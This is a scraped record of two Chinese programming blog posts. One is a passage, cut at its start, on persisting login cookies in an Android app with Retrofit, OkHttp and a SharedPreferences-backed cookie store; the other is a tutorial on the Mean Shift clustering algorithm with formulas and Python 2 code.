.build();\n\n上面的.addCookieJar就成功的帮我们将session和cookie放到了请求头里面，当调用了用户登录的接口之后，服务器接口的header里面的cookie和session我们就已经保存了。同时问题也来了，我们可以看出来并没有将cookie存到本地，也就是说当我们将APP关闭之后，如果你不再次调用登录接口就去直接调用别的接口，用户的cookie是错误的，服务器不识别你的当前用户，当然最笨的方法就是每次进入APP的时候都调用一下登录接口，这样也可以实现，但是…. \n所以我的解决办法：\n\n \n重点就在这： \nJavaNetCookieJar是CookieHandler的一个代理，它实现了CookieJar，我们可以看到它里面的loadForRequest（）方法帮助我们从请求头里面获取了cookie并且通过saveFromResponse（）保存了下来。\n\n\n\n@Override public List<Cookie> loadForRequest(HttpUrl url) {\n    // The RI passes all headers. We don't have 'em, so we don't pass 'em!\n    Map<String, List<String>> headers = Collections.emptyMap();\n    Map<String, List<String>> cookieHeaders;\n    try {\n      cookieHeaders = cookieHandler.get(url.uri(), headers);\n    } catch (IOException e) {\n      Internal.logger.log(WARNING, \"Loading cookies failed for \" + url.resolve(\"/...\"), e);\n      return Collections.emptyList();\n    }\n\n    List<Cookie> cookies = null;\n    for (Map.Entry<String, List<String>> entry : cookieHeaders.entrySet()) {\n      String key = entry.getKey();\n      if ((\"Cookie\".equalsIgnoreCase(key) || \"Cookie2\".equalsIgnoreCase(key))\n          && !entry.getValue().isEmpty()) {\n        for (String header : entry.getValue()) {\n          if (cookies == null) cookies = new ArrayList<>();\n          cookies.addAll(decodeHeaderAsJavaNetCookies(url, header));\n        }\n      }\n    }\n\n    return cookies != null\n        ? Collections.unmodifiableList(cookies)\n        : Collections.<Cookie>emptyList();\n  }\n\n\n\n@Override public void saveFromResponse(HttpUrl url, List<Cookie> cookies) {\n    if (cookieHandler != null) {\n      List<String> cookieStrings = new ArrayList<>();\n      for (Cookie cookie : cookies) {\n        cookieStrings.add(cookie.toString());\n      }\n      Map<String, List<String>> multimap = Collections.singletonMap(\"Set-Cookie\", cookieStrings);\n      try {\n        cookieHandler.put(url.uri(), multimap);\n      } catch (IOException e) {\n        Internal.logger.log(WARNING, \"Saving cookies failed for \" + url.resolve(\"/...\"), e);\n      }\n    }\n  }\n\n可以还是并没有实现本地保存啊，接着往下看：\n\n\n\nimport android.content.Context;\nimport android.content.SharedPreferences;\nimport android.text.TextUtils;\nimport android.util.Log;\n\nimport java.io.*;\nimport java.net.CookieStore;\nimport java.net.HttpCookie;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.*;\nimport java.util.concurrent.ConcurrentHashMap;\n/**\n * Created by <a href=\"http://www.jiechic.com\" target=\"_blank\">jiechic</a> on 15/5/27.\n */\n/**\n * A persistent cookie store which implements the Apache HttpClient CookieStore interface.\n * Cookies are stored and will persist on the user's device between application sessions since they\n * are serialized and stored in SharedPreferences. Instances of this class are\n * designed to be used with AsyncHttpClient#setCookieStore, but can also be used with a\n * regular old apache HttpClient/HttpContext if you prefer.\n */\npublic class PersistentCookieStore implements CookieStore {\n\n    private static final String LOG_TAG = \"PersistentCookieStore\";\n    private static final String COOKIE_PREFS = \"CookiePrefsFile\";\n    private static final String COOKIE_NAME_PREFIX = \"cookie_\";\n\n    private final HashMap<String, ConcurrentHashMap<String, HttpCookie>> cookies;\n    private final SharedPreferences cookiePrefs;\n\n    /**\n     * Construct a persistent cookie store.\n     *\n     * @param context Context to attach cookie store to\n     */\n    public PersistentCookieStore(Context context) {\n        cookiePrefs = context.getSharedPreferences(COOKIE_PREFS, 0);\n        cookies = new HashMap<String, ConcurrentHashMap<String, HttpCookie>>();\n\n        // Load any previously stored cookies into the store\n        Map<String, ?> prefsMap = cookiePrefs.getAll();\n        for(Map.Entry<String, ?> entry : prefsMap.entrySet()) {\n            if (((String)entry.getValue()) != null && !((String)entry.getValue()).startsWith(COOKIE_NAME_PREFIX)) {\n                String[] cookieNames = TextUtils.split((String)entry.getValue(), \",\");\n                for (String name : cookieNames) {\n                    String encodedCookie = cookiePrefs.getString(COOKIE_NAME_PREFIX + name, null);\n                    if (encodedCookie != null) {\n                        HttpCookie decodedCookie = decodeCookie(encodedCookie);\n                        if (decodedCookie != null) {\n                            if(!cookies.containsKey(entry.getKey()))\n                                cookies.put(entry.getKey(), new ConcurrentHashMap<String, HttpCookie>());\n                            cookies.get(entry.getKey()).put(name, decodedCookie);\n                        }\n                    }\n                }\n\n            }\n        }\n    }\n\n    @Override\n    public void add(URI uri, HttpCookie cookie) {\n\n        // Save cookie into local store, or remove if expired\n        if (!cookie.hasExpired()) {\n            if(!cookies.containsKey(cookie.getDomain()))\n                cookies.put(cookie.getDomain(), new ConcurrentHashMap<String, HttpCookie>());\n            cookies.get(cookie.getDomain()).put(cookie.getName(), cookie);\n        } else {\n            if(cookies.containsKey(cookie.getDomain()))\n                cookies.get(cookie.getDomain()).remove(cookie.getDomain());\n        }\n\n        // Save cookie into persistent store\n        SharedPreferences.Editor prefsWriter = cookiePrefs.edit();\n        prefsWriter.putString(cookie.getDomain(), TextUtils.join(\",\", cookies.get(cookie.getDomain()).keySet()));\n        prefsWriter.putString(COOKIE_NAME_PREFIX + cookie.getName(), encodeCookie(new SerializableHttpCookie(cookie)));\n        prefsWriter.commit();\n    }\n\n    protected String getCookieToken(URI uri, HttpCookie cookie) {\n        return cookie.getName() + cookie.getDomain();\n    }\n\n    @Override\n    public List<HttpCookie> get(URI uri) {\n        ArrayList<HttpCookie> ret = new ArrayList<HttpCookie>();\n        for (String key:cookies.keySet()){\n            if (uri.getHost().contains(key)){\n                ret.addAll(cookies.get(key).values());\n            }\n        }\n        return ret;\n    }\n\n    @Override\n    public boolean removeAll() {\n        SharedPreferences.Editor prefsWriter = cookiePrefs.edit();\n        prefsWriter.clear();\n        prefsWriter.commit();\n        cookies.clear();\n        return true;\n    }\n\n\n    @Override\n    public boolean remove(URI uri, HttpCookie cookie) {\n        String name = getCookieToken(uri, cookie);\n\n        if(cookies.containsKey(uri.getHost()) && cookies.get(uri.getHost()).containsKey(name)) {\n            cookies.get(uri.getHost()).remove(name);\n\n            SharedPreferences.Editor prefsWriter = cookiePrefs.edit();\n            if(cookiePrefs.contains(COOKIE_NAME_PREFIX + name)) {\n                prefsWriter.remove(COOKIE_NAME_PREFIX + name);\n            }\n            prefsWriter.putString(uri.getHost(), TextUtils.join(\",\", cookies.get(uri.getHost()).keySet()));\n            prefsWriter.commit();\n\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    @Override\n    public List<HttpCookie> getCookies() {\n        ArrayList<HttpCookie> ret = new ArrayList<HttpCookie>();\n        for (String key : cookies.keySet())\n            ret.addAll(cookies.get(key).values());\n\n        return ret;\n    }\n\n    @Override\n    public List<URI> getURIs() {\n        ArrayList<URI> ret = new ArrayList<URI>();\n        for (String key : cookies.keySet())\n            try {\n                ret.add(new URI(key));\n            } catch (URISyntaxException e) {\n                e.printStackTrace();\n            }\n\n        return ret;\n    }\n\n    /**\n     * Serializes Cookie object into String\n     *\n     * @param cookie cookie to be encoded, can be null\n     * @return cookie encoded as String\n     */\n    protected String encodeCookie(SerializableHttpCookie cookie) {\n        if (cookie == null)\n            return null;\n        ByteArrayOutputStream os = new ByteArrayOutputStream();\n        try {\n            ObjectOutputStream outputStream = new ObjectOutputStream(os);\n            outputStream.writeObject(cookie);\n        } catch (IOException e) {\n            Log.d(LOG_TAG, \"IOException in encodeCookie\", e);\n            return null;\n        }\n\n        return byteArrayToHexString(os.toByteArray());\n    }\n\n    /**\n     * Returns cookie decoded from cookie string\n     *\n     * @param cookieString string of cookie as returned from http request\n     * @return decoded cookie or null if exception occured\n     */\n    protected HttpCookie decodeCookie(String cookieString) {\n        byte[] bytes = hexStringToByteArray(cookieString);\n        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);\n        HttpCookie cookie = null;\n        try {\n            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);\n            cookie = ((SerializableHttpCookie) objectInputStream.readObject()).getCookie();\n        } catch (IOException e) {\n            Log.d(LOG_TAG, \"IOException in decodeCookie\", e);\n        } catch (ClassNotFoundException e) {\n            Log.d(LOG_TAG, \"ClassNotFoundException in decodeCookie\", e);\n        }\n\n        return cookie;\n    }\n\n    /**\n     * Using some super basic byte array <-> hex conversions so we don't have to rely on any\n     * large Base64 libraries. Can be overridden if you like!\n     *\n     * @param bytes byte array to be converted\n     * @return string containing hex values\n     */\n    protected String byteArrayToHexString(byte[] bytes) {\n        StringBuilder sb = new StringBuilder(bytes.length * 2);\n        for (byte element : bytes) {\n            int v = element & 0xff;\n            if (v < 16) {\n                sb.append('0');\n            }\n            sb.append(Integer.toHexString(v));\n        }\n        return sb.toString().toUpperCase(Locale.US);\n    }\n\n    /**\n     * Converts hex values from strings to byte arra\n     *\n     * @param hexString string of hex-encoded values\n     * @return decoded byte array\n     */\n    protected byte[] hexStringToByteArray(String hexString) {\n        int len = hexString.length();\n        byte[] data = new byte[len / 2];\n        for (int i = 0; i < len; i += 2) {\n            data[i / 2] = (byte) ((Character.digit(hexString.charAt(i), 16) << 4) + Character.digit(hexString.charAt(i + 1), 16));\n        }\n        return data;\n    }\n}\n\n我们自定义一个CookieStore来本地存储cookie，存储到SharedPreferences里。当然你也可以用这个： \nhttps://github.com/franmontiel/PersistentCookieJar \n都是可以的，这样就完美实现了cookie的持久化管理。 \n下面是小编封装的一个网络请求类，不喜勿喷，哈哈：\n\n\n\n\nimport android.content.Context;\n\nimport com.hankkin.bpm.Constant;\nimport com.hankkin.bpm.http.cookie.PersistentCookieStore;\n\nimport java.net.CookieHandler;\nimport java.net.CookieManager;\nimport java.net.CookiePolicy;\nimport java.util.concurrent.TimeUnit;\n\nimport okhttp3.OkHttpClient;\nimport okhttp3.internal.JavaNetCookieJar;\nimport okhttp3.logging.HttpLoggingInterceptor;\nimport retrofit2.Retrofit;\nimport retrofit2.converter.gson.GsonConverterFactory;\n\n/**\n * Created by Hankkin on 16/4/25.\n */\npublic class HttpControl {\n\n    private static HttpControl mInstance;\n    private Retrofit retrofit;\n\n    public static HttpControl getInstance(Context context){\n        if (mInstance == null){\n            synchronized (HttpControl.class){\n                if (mInstance == null)\n                    mInstance = new HttpControl(context);\n            }\n        }\n        return mInstance;\n    }\n    public HttpControl(Context context){\n\n        CookieHandler cookieHandler = new CookieManager(new PersistentCookieStore(context),\n                CookiePolicy.ACCEPT_ALL);\n\n\n        HttpLoggingInterceptor logging = new HttpLoggingInterceptor();\n        logging.setLevel(HttpLoggingInterceptor.Level.BODY);\n\n\n\n        OkHttpClient okHttpClient = new OkHttpClient.Builder()\n                .readTimeout(7676, TimeUnit.MILLISECONDS)\n                .connectTimeout(7676,TimeUnit.MILLISECONDS)\n                .addInterceptor(logging)\n                .cookieJar(new JavaNetCookieJar(cookieHandler))\n                .build();\n\n\n        retrofit = new Retrofit.Builder().\n                baseUrl(Constant.BASE_URL).\n                addConverterFactory(GsonConverterFactory.create())\n                .client(okHttpClient)\n                .build();\n    }\n\n\n\n    public  <T> T createService(Class<T> clz){\n        return retrofit.create(clz);\n    }\n}\n\n\n补充：在这里可以查到SerializableHttpCookie这个文件 \nhttp://www.2cto.com/kf/201507/419264.html \n感谢大家的提醒谢谢啦\n\n推荐几篇这方面的资料，小编也是参考了一下资料： \nhttp://stackoverflow.com/questions/34881775/automatic-cookie-handling-with-okhttp-3 \nhttp://www.open-open.com/lib/view/open1453422314105.html \nhttp://stackoverflow.com/questions/tagged/okhttp?sort=active", "time": "2018_08_14_11_13_11", "link": "https://blog.csdn.net/lyhhj/article/details/51345386", "title": "Retrofit+OKHttp 教你怎么持久化管理Cookie"}
{"timestamp": "2018_08_14_11_13_11", "desc": "一、Mean Shift算法概述\n\nMean Shift算法，又称为均值漂移算法，Mean Shift的概念最早是由Fukunage在1975年提出的，在后来由Yizong Cheng对其进行扩充，主要提出了两点的改进：\n\n\n定义了核函数；\n增加了权重系数。\n\n\n核函数的定义使得偏移值对偏移向量的贡献随之样本与被偏移点的距离的不同而不同。权重系数使得不同样本的权重不同。Mean Shift算法在聚类，图像平滑、分割以及视频跟踪等方面有广泛的应用。\n\n\n\n二、Mean Shift算法的核心原理\n\n\n\n2.1、核函数\n\n在Mean Shift算法中引入核函数的目的是使得随着样本与被偏移点的距离不同，其偏移量对均值偏移向量的贡献也不同。核函数是机器学习中常用的一种方式。核函数的定义如下所示：\n\n\n  X\\mathbf{X}表示一个dd维的欧式空间，xx是该空间中的一个点x={x1,x2,x3⋯,xd}x=\\left \\{ x_1,x_2,x_3\\cdots ,x_d \\right \\}，其中，xx的模∥x∥2=xxT\\left \\| x \\right \\|^2=xx^T，R\\mathbf{R}表示实数域，如果一个函数K:X→RK:\\mathbf{X}\\rightarrow \\mathbf{R}存在一个剖面函数k:[0,∞]→Rk:\\left [ 0,\\infty  \\right ]\\rightarrow \\mathbf{R}，即 \n  K(x)=k(∥x∥2)K\\left ( x \\right )=k\\left ( \\left \\| x \\right \\|^2 \\right ) \n  并且满足： \n  (1)、kk是非负的 \n  (2)、kk是非增的 \n  (3)、kk是分段连续的 \n  那么，函数K(x)K\\left ( x \\right )就称为核函数。\n\n\n常用的核函数有高斯核函数。高斯核函数如下所示：\n\n\n\nN(x)=12π−−√he−x22h2N\\left ( x \\right )=\\frac{1}{\\sqrt{2\\pi }h}e^{-\\frac{x^2}{2h^2}}\n\n其中，hh称为带宽(bandwidth)，不同带宽的核函数如下图所示：\n\n\n\n上图的画图脚本如下所示：\n\n'''\nDate:201604026\n@author: zhaozhiyong\n'''\nimport matplotlib.pyplot as plt\nimport math\n\ndef cal_Gaussian(x, h=1):\n    molecule = x * x\n    denominator = 2 * h * h\n    left = 1 / (math.sqrt(2 * math.pi) * h)\n    return left * math.exp(-molecule / denominator)\n\nx = []\n\nfor i in xrange(-40,40):\n    x.append(i * 0.5);\n\nscore_1 = []\nscore_2 = []\nscore_3 = []\nscore_4 = []\n\nfor i in x:\n    score_1.append(cal_Gaussian(i,1))\n    score_2.append(cal_Gaussian(i,2))\n    score_3.append(cal_Gaussian(i,3))\n    score_4.append(cal_Gaussian(i,4))\n\nplt.plot(x, score_1, 'b--', label=\"h=1\")\nplt.plot(x, score_2, 'k--', label=\"h=2\")\nplt.plot(x, score_3, 'g--', label=\"h=3\")\nplt.plot(x, score_4, 'r--', label=\"h=4\")\n\nplt.legend(loc=\"upper right\")\nplt.xlabel(\"x\")\nplt.ylabel(\"N\")\nplt.show()\n\n\n\n\n2.2、Mean Shift算法的核心思想\n\n\n\n2.2.1、基本原理\n\n对于Mean Shift算法，是一个迭代的步骤，即先算出当前点的偏移均值，将该点移动到此偏移均值，然后以此为新的起始点，继续移动，直到满足最终的条件。此过程可由下图的过程进行说明(图片来自参考文献3)：\n\n\n步骤1：在指定的区域内计算偏移均值(如下图的黄色的圈)\n\n\n\n\n\n步骤2：移动该点到偏移均值点处\n\n\n\n\n\n步骤3： 重复上述的过程(计算新的偏移均值，移动)\n\n\n\n\n\n\n\n\n\n\n\n步骤4：满足了最终的条件，即退出\n\n\n\n\n从上述过程可以看出，在Mean Shift算法中，最关键的就是计算每个点的偏移均值，然后根据新计算的偏移均值更新点的位置。\n\n\n\n2.2.2、基本的Mean Shift向量形式\n\n对于给定的dd维空间RdR^d中的nn个样本点xi,i=1,⋯,nx_i, i=1,\\cdots , n，则对于xx点，其Mean Shift向量的基本形式为：\n\n\n\nMh(x)=1k∑xi∈Sh(xi−x)M_h\\left ( x \\right )=\\frac{1}{k}\\sum_{x_i\\in S_h}\\left ( x_i-x \\right )\n\n其中，ShS_h指的是一个半径为hh的高维球区域，如上图中的蓝色的圆形区域。ShS_h的定义为：\n\n\n\nSh(x)=(y∣(y−x)(y−x)T⩽h2)S_h\\left ( x \\right )=\\left ( y\\mid \\left ( y-x \\right )\\left ( y-x \\right )^T\\leqslant h^2 \\right )\n\n这样的一种基本的Mean Shift形式存在一个问题：在ShS_h的区域内，每一个点对xx的贡献是一样的。而实际上，这种贡献与xx到每一个点之间的距离是相关的。同时，对于每一个样本，其重要程度也是不一样的。\n\n\n\n2.2.3、改进的Mean Shift向量形式\n\n基于以上的考虑，对基本的Mean Shift向量形式中增加核函数和样本权重，得到如下的改进的Mean Shift向量形式：\n\n\n\nMh(x)=∑ni=1GH(xi−x)w(xi)(xi−x)∑ni=1GH(xi−x)w(xi)M_h\\left ( x \\right )=\\frac{\\sum_{i=1}^{n}G_H\\left ( x_i-x \\right )w\\left ( x_i \\right )\\left ( x_i-x \\right )}{\\sum_{i=1}^{n}G_H\\left ( x_i-x \\right )w\\left ( x_i \\right )}\n\n其中：\n\n\n\nGH(xi−x)=|H|−12G(H−12(xi−x))G_H\\left ( x_i-x \\right )=\\left | H \\right |^{-\\frac{1}{2}}G\\left ( H^{-\\frac{1}{2}}\\left ( x_i-x \\right ) \\right )\n\nG(x)G\\left ( x\\right )是一个单位的核函数。HH是一个正定的对称d×dd\\times d矩阵，称为带宽矩阵，其是一个对角阵。w(xi)⩾0w\\left ( x_i \\right )\\geqslant 0是每一个样本的权重。对角阵HH的形式为：\n\n\n\nH=⎛⎝⎜⎜⎜⎜⎜h210⋮00h22⋮0⋯⋯⋯00⋮h2d⎞⎠⎟⎟⎟⎟⎟d×dH=\\begin{pmatrix}\nh_1^2 & 0 & \\cdots & 0\\\\ \n0 & h_2^2 & \\cdots & 0\\\\ \n\\vdots  & \\vdots  &  & \\vdots \\\\ \n0 & 0 & \\cdots & h_d^2\n\\end{pmatrix}_{d\\times d}\n\n上述的Mean Shift向量可以改写成：\n\n\n\nMh(x)=∑ni=1G(xi−xhi)w(xi)(xi−x)∑ni=1G(xi−xhi)w(xi)M_h\\left ( x \\right )=\\frac{\\sum_{i=1}^{n}G\\left ( \\frac{x_i-x}{h_i} \\right )w\\left ( x_i \\right )\\left ( x_i-x \\right )}{\\sum_{i=1}^{n}G\\left ( \\frac{x_i-x}{h_i} \\right )w\\left ( x_i \\right )}\n\n\n  Mean Shift向量Mh(x)M_h\\left ( x \\right )是归一化的概率密度梯度。\n\n\n\n\n2.3、Mean Shift算法的解释\n\n在Mean Shift算法中，实际上是利用了概率密度，求得概率密度的局部最优解。\n\n\n\n2.3.1、概率密度梯度\n\n\n  对一个概率密度函数f(x)f\\left ( x \\right )，已知dd维空间中nn个采样点xi,i=1,⋯,nx_i,i=1,\\cdots ,n，f(x)f\\left ( x \\right )的核函数估计(也称为Parzen窗估计)为： \n  f^(x)=∑ni=1K(xi−xh)w(xi)hd∑ni=1w(xi)\\hat{f}\\left ( x \\right )=\\frac{\\sum_{i=1}^{n}K\\left ( \\frac{x_i-x}{h} \\right )w\\left ( x_i \\right )}{h^d\\sum_{i=1}^{n}w\\left ( x_i \\right )} \n  其中 \n  w(xi)⩾0w\\left ( x_i \\right )\\geqslant 0是一个赋给采样点xix_i的权重 \n  K(x)K\\left ( x \\right )是一个核函数\n\n\n概率密度函数f(x)f\\left ( x \\right )的梯度▽f(x)\\bigtriangledown f\\left ( x \\right )的估计为\n\n\n\n▽f^(x)=2∑ni=1(x−xi)k′(∥∥xi−xh∥∥2)w(xi)hd+2∑ni=1w(xi)\\bigtriangledown \\hat{f}\\left ( x \\right )=\\frac{2\\sum_{i=1}^{n}\\left ( x-x_i \\right ){k}'\\left ( \\left \\| \\frac{x_i-x}{h} \\right \\|^2 \\right )w\\left ( x_i \\right )}{h^{d+2}\\sum_{i=1}^{n}w\\left ( x_i \\right )}\n\n令g(x)=−k′(x)g\\left ( x \\right )=-{k}'\\left ( x \\right )，G(x)=g(∥x∥2)G\\left ( x \\right )=g\\left ( \\left \\| x \\right \\|^2 \\right )，则有：\n\n\n\n▽f^(x)=2∑ni=1(xi−x)G(∥∥xi−xh∥∥2)w(xi)hd+2∑ni=1w(xi)=2h2⎡⎣⎢∑ni=1G(xi−xh)w(xi)hd∑ni=1w(xi)⎤⎦⎥⎡⎣⎢∑ni=1(xi−x)G(∥∥xi−xh∥∥2)w(xi)∑ni=1G(xi−xh)w(xi)⎤⎦⎥\\begin{align*}\n\\bigtriangledown \\hat{f}\\left ( x \\right ) &= \\frac{2\\sum_{i=1}^{n}\\left ( x_i-x \\right )G\\left ( \\left \\| \\frac{x_i-x}{h} \\right \\|^2 \\right )w\\left ( x_i \\right )}{h^{d+2}\\sum_{i=1}^{n}w\\left ( x_i \\right )}\\\\ \n &= \\frac{2}{h^2}\\left [ \\frac{\\sum_{i=1}^{n}G\\left ( \\frac{x_i-x}{h} \\right )w\\left ( x_i \\right )}{h^d\\sum_{i=1}^{n}w\\left ( x_i \\right )} \\right ]\\left [ \\frac{\\sum_{i=1}^{n}\\left ( x_i-x \\right )G\\left ( \\left \\| \\frac{x_i-x}{h} \\right \\|^2 \\right )w\\left ( x_i \\right )}{\\sum_{i=1}^{n}G\\left ( \\frac{x_i-x}{h} \\right )w\\left ( x_i \\right )} \\right ]\n\\end{align*}\n\n其中，第二个方括号中的就是Mean Shift向量，其与概率密度梯度成正比。\n\n\n\n2.3.2、Mean Shift向量的修正\n\nMh(x)=∑ni=1G(∥∥xi−xh∥∥2)w(xi)xi∑ni=1G(xi−xh)w(xi)−xM_h\\left ( x \\right )=\\frac{\\sum_{i=1}^{n}G\\left ( \\left \\| \\frac{x_i-x}{h} \\right \\|^2 \\right )w\\left ( x_i \\right )x_i}{\\sum_{i=1}^{n}G\\left ( \\frac{x_i-x}{h} \\right )w\\left ( x_i \\right )}-x\n\n记：mh(x)=∑ni=1G(∥∥xi−xh∥∥2)w(xi)xi∑ni=1G(xi−xh)w(xi)m_h\\left ( x \\right )=\\frac{\\sum_{i=1}^{n}G\\left ( \\left \\| \\frac{x_i-x}{h} \\right \\|^2 \\right )w\\left ( x_i \\right )x_i}{\\sum_{i=1}^{n}G\\left ( \\frac{x_i-x}{h} \\right )w\\left ( x_i \\right )}，则上式变成：\n\n\n\nMh(x)=mh(x)+xM_h\\left ( x \\right )=m_h\\left ( x \\right )+x\n\n这与梯度上升的过程一致。\n\n\n\n2.4、Mean Shift算法流程\n\nMean Shift算法的算法流程如下：\n\n\n计算mh(x)m_h\\left ( x \\right )\n令x=mh(x)x=m_h\\left ( x \\right )\n如果∥mh(x)−x∥<ε\\left \\| m_h\\left ( x \\right )-x \\right \\|< \\varepsilon ，结束循环，否则，重复上述步骤\n\n\n\n\n三、实验\n\n\n\n3.1、实验数据\n\n实验数据如下图所示(来自参考文献1)：\n\n\n\n画图的代码如下：\n\n\n\n'''\nDate:20160426\n@author: zhaozhiyong\n'''\nimport matplotlib.pyplot as plt\n\nf = open(\"data\")\nx = []\ny = []\nfor line in f.readlines():\n    lines = line.strip().split(\"\\t\")\n    if len(lines) == 2:\n        x.append(float(lines[0]))\n        y.append(float(lines[1]))\nf.close()  \n\nplt.plot(x, y, 'b.', label=\"original data\")\nplt.title('Mean Shift')\nplt.legend(loc=\"upper right\")\nplt.show()\n\n\n\n\n3.2、实验的源码\n\n\n\n#!/bin/python\n#coding:UTF-8\n'''\nDate:20160426\n@author: zhaozhiyong\n'''\n\nimport math\nimport sys\nimport numpy as np\n\nMIN_DISTANCE = 0.000001#mini error\n\ndef load_data(path, feature_num=2):\n    f = open(path)\n    data = []\n    for line in f.readlines():\n        lines = line.strip().split(\"\\t\")\n        data_tmp = []\n        if len(lines) != feature_num:\n            continue\n        for i in xrange(feature_num):\n            data_tmp.append(float(lines[i]))\n\n        data.append(data_tmp)\n    f.close()\n    return data\n\ndef gaussian_kernel(distance, bandwidth):\n    m = np.shape(distance)[0]\n    right = np.mat(np.zeros((m, 1)))\n    for i in xrange(m):\n        right[i, 0] = (-0.5 * distance[i] * distance[i].T) / (bandwidth * bandwidth)\n        right[i, 0] = np.exp(right[i, 0])\n    left = 1 / (bandwidth * math.sqrt(2 * math.pi))\n\n    gaussian_val = left * right\n    return gaussian_val\n\ndef shift_point(point, points, kernel_bandwidth):\n    points = np.mat(points)\n    m,n = np.shape(points)\n    #计算距离\n    point_distances = np.mat(np.zeros((m,1)))\n    for i in xrange(m):\n        point_distances[i, 0] = np.sqrt((point - points[i]) * (point - points[i]).T)\n\n    #计算高斯核      \n    point_weights = gaussian_kernel(point_distances, kernel_bandwidth)\n\n    #计算分母\n    all = 0.0\n    for i in xrange(m):\n        all += point_weights[i, 0]\n\n    #均值偏移\n    point_shifted = point_weights.T * points / all\n    return point_shifted\n\ndef euclidean_dist(pointA, pointB):\n    #计算pointA和pointB之间的欧式距离\n    total = (pointA - pointB) * (pointA - pointB).T\n    return math.sqrt(total)\n\ndef distance_to_group(point, group):\n    min_distance = 10000.0\n    for pt in group:\n        dist = euclidean_dist(point, pt)\n        if dist < min_distance:\n            min_distance = dist\n    return min_distance\n\ndef group_points(mean_shift_points):\n    group_assignment = []\n    m,n = np.shape(mean_shift_points)\n    index = 0\n    index_dict = {}\n    for i in xrange(m):\n        item = []\n        for j in xrange(n):\n            item.append(str((\"%5.2f\" % mean_shift_points[i, j])))\n\n        item_1 = \"_\".join(item)\n        print item_1\n        if item_1 not in index_dict:\n            index_dict[item_1] = index\n            index += 1\n\n    for i in xrange(m):\n        item = []\n                for j in xrange(n):\n                        item.append(str((\"%5.2f\" % mean_shift_points[i, j])))\n\n                item_1 = \"_\".join(item)\n        group_assignment.append(index_dict[item_1])\n\n    return group_assignment\n\ndef train_mean_shift(points, kenel_bandwidth=2):\n    #shift_points = np.array(points)\n    mean_shift_points = np.mat(points)\n    max_min_dist = 1\n    iter = 0\n    m, n = np.shape(mean_shift_points)\n    need_shift = [True] * m\n\n    #cal the mean shift vector\n    while max_min_dist > MIN_DISTANCE:\n        max_min_dist = 0\n        iter += 1\n        print \"iter : \" + str(iter)\n        for i in range(0, m):\n            #判断每一个样本点是否需要计算偏置均值\n            if not need_shift[i]:\n                continue\n            p_new = mean_shift_points[i]\n            p_new_start = p_new\n            p_new = shift_point(p_new, points, kenel_bandwidth)\n            dist = euclidean_dist(p_new, p_new_start)\n\n            if dist > max_min_dist:#record the max in all points\n                max_min_dist = dist\n            if dist < MIN_DISTANCE:#no need to move\n                need_shift[i] = False\n\n            mean_shift_points[i] = p_new\n    #计算最终的group\n    group = group_points(mean_shift_points)\n\n    return np.mat(points), mean_shift_points, group\n\nif __name__ == \"__main__\":\n    #导入数据集\n    path = \"./data\"\n    data = load_data(path, 2)\n\n    #训练，h=2\n    points, shift_points, cluster = train_mean_shift(data, 2)\n\n    for i in xrange(len(cluster)):\n        print \"%5.2f,%5.2f\\t%5.2f,%5.2f\\t%i\" % (points[i,0], points[i, 1], shift_points[i, 0], shift_points[i, 1], cluster[i])\n\n\n\n3.3、实验的结果\n\n经过Mean Shift算法聚类后的数据如下所示：\n\n\n\n\n\n'''\nDate:20160426\n@author: zhaozhiyong\n'''\nimport matplotlib.pyplot as plt\n\nf = open(\"data_mean\")\ncluster_x_0 = []\ncluster_x_1 = []\ncluster_x_2 = []\ncluster_y_0 = []\ncluster_y_1 = []\ncluster_y_2 = []\ncenter_x = []\ncenter_y = []\ncenter_dict = {}\n\nfor line in f.readlines():\n    lines = line.strip().split(\"\\t\")\n    if len(lines) == 3:\n        label = int(lines[2])\n        if label == 0:\n            data_1 = lines[0].strip().split(\",\")\n            cluster_x_0.append(float(data_1[0]))\n            cluster_y_0.append(float(data_1[1]))\n            if label not in center_dict:\n                center_dict[label] = 1\n                data_2 = lines[1].strip().split(\",\")\n                center_x.append(float(data_2[0]))\n                center_y.append(float(data_2[1]))\n        elif label == 1:\n            data_1 = lines[0].strip().split(\",\")\n            cluster_x_1.append(float(data_1[0]))\n            cluster_y_1.append(float(data_1[1]))\n            if label not in center_dict:\n                center_dict[label] = 1\n                data_2 = lines[1].strip().split(\",\")\n                center_x.append(float(data_2[0]))\n                center_y.append(float(data_2[1]))\n        else:\n            data_1 = lines[0].strip().split(\",\")\n            cluster_x_2.append(float(data_1[0]))\n            cluster_y_2.append(float(data_1[1]))\n            if label not in center_dict:\n                center_dict[label] = 1\n                data_2 = lines[1].strip().split(\",\")\n                center_x.append(float(data_2[0]))\n                center_y.append(float(data_2[1]))    \nf.close()\n\n\nplt.plot(cluster_x_0, cluster_y_0, 'b.', label=\"cluster_0\")\nplt.plot(cluster_x_1, cluster_y_1, 'g.', label=\"cluster_1\")\nplt.plot(cluster_x_2, cluster_y_2, 'k.', label=\"cluster_2\")\nplt.plot(center_x, center_y, 'r+', label=\"mean point\")\nplt.title('Mean Shift 2')\n#plt.legend(loc=\"best\")\nplt.show()\n\n\n\n参考文献\n\n\nMean Shift Clustering\nMeanshift，聚类算法\nmeanshift算法简介", "time": "2018_08_14_11_13_11", "link": "https://blog.csdn.net/google19890102/article/details/51030884", "title": "简单易学的机器学习算法——Mean Shift聚类算法"}
